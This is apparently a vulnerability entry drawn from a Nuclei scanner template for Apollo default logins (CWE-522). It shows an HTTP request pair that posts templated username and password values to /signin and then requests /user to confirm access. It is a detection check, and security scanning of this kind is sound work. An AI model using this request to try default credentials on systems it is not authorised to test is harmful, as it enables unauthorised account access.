# Vulnerability: Apollo Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`apollo-default-login.yaml`)

## Description
An Apollo default login was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /signin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/signin?

username={{user}}&password={{pass}}&login-submit=Login

GET /user HTTP/1.1
Host: {{Hostname}}
```

